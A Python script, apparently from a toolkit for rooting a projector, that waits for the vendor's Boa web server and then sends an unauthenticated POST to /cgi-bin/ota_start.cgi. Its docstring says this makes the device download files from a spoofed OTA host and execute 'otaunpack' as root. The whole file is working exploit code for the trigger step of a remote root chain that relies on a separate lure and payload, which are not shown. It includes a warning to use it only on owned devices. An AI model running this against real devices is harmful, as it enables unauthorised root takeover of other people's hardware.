#!/usr/bin/env python3
"""Wait for the beamer's vendor web UI, then trigger one OTA check.

The OTA client is started by ``POST /cgi-bin/ota_start.cgi`` with the body
``updatetxt=1``.  That request is state-changing: the device will contact its
configured OTA host, download three files and execute the downloaded
``otaunpack`` as root.  Only run this against a device you own and after the
lure/responder is in place.

The script waits until the real vendor Boa answers on ``--target``.  It only
accepts a response whose ``Server`` header contains ``Boa/0.94.13`` and whose
body contains ``Lollipop``, so the payload's own ``DocumentRoot /`` server or
an unrelated HTTP service is not mistaken for the vendor UI.

Usage::

    python3 tools/trigger.py --target 10.42.0.31 --wait
    python3 tools/trigger.py --target 10.42.0.31 --wait 120 --attempts 1

``--wait`` without a value waits up to 600 seconds; with a value it waits that
many seconds.  Without ``--wait`` the device is probed once.  ``--attempts``
is the number of POSTs after the vendor UI has been found (default: 1).
"""
import argparse
import sys
import time
import urllib.error
import urllib.request

USER_AGENT = "lollipop-trigger/1.0"
OTA_PATH = "/cgi-bin/ota_start.cgi"
OTA_BODY = b"updatetxt=1"


def log(msg):
    """Print one timestamped line."""
    print("%s %s" % (time.strftime("%Y-%m-%d %H:%M:%S"), msg), flush=True)


def http_get(target, path, timeout):
    """GET a path and return (status, body, headers)."""
    url = "http://%s%s" % (target, path)
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(8192), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(8192), exc.headers


def http_post(target, path, body, timeout):
    """POST a form body and return (status, body, headers)."""
    url = "http://%s%s" % (target, path)
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(8192), resp.headers
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(8192), exc.headers


def is_vendor_boa(status, body, headers):
    """True only for the device's own Boa and its Lollipop index page."""
    server = headers.get("Server", "") if headers else ""
    return status == 200 and "Boa/0.94.13" in server and b"Lollipop" in body


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True,
                    help="device IP address (for example 10.42.0.31)")
    ap.add_argument("--wait", nargs="?", const=600.0, default=0.0, type=float,
                    metavar="SECONDS",
                    help="wait up to SECONDS for the device; bare --wait uses 600")
    ap.add_argument("--attempts", type=int, default=1,
                    help="number of ota_start.cgi POSTs after detection (default: 1)")
    ap.add_argument("--timeout", type=float, default=6.0,
                    help="per-request HTTP timeout in seconds (default: 6)")
    args = ap.parse_args()

    if args.wait < 0:
        ap.error("--wait must not be negative")
    if args.attempts < 1:
        ap.error("--attempts must be at least 1")
    if args.timeout <= 0:
        ap.error("--timeout must be positive")

    deadline = time.time() + args.wait
    log("waiting for vendor Boa on %s (wait=%gs, attempts=%d)" % (
        args.target, args.wait, args.attempts))

    while True:
        try:
            status, body, headers = http_get(args.target, "/", args.timeout)
            if is_vendor_boa(status, body, headers):
                log("vendor Boa detected: status=%s server=%r body=%d bytes" % (
                    status, headers.get("Server"), len(body)))
                triggered = 0
                for n in range(args.attempts):
                    try:
                        st, b, _ = http_post(args.target, OTA_PATH, OTA_BODY,
                                             args.timeout)
                        log("POST %s #%d status=%s body=%r" % (
                            OTA_PATH, n + 1, st, b[:120]))
                        triggered += 1
                    except Exception as exc:  # network error, timeout, reset
                        log("POST %s #%d failed: %r" % (OTA_PATH, n + 1, exc))
                    if n + 1 < args.attempts:
                        time.sleep(1.0)
                return 0 if triggered else 1

            log("device answered, but not the vendor UI: status=%s server=%r "
                "lollipop=%s" % (
                    status,
                    headers.get("Server") if headers else None,
                    b"Lollipop" in body))
        except Exception as exc:
            log("waiting for %s: %r" % (args.target, exc))

        remaining = deadline - time.time()
        if remaining <= 0:
            break
        time.sleep(min(3.0, remaining))

    log("no vendor Boa on %s within %.1fs" % (args.target, args.wait))
    return 2


if __name__ == "__main__":
    sys.exit(main())
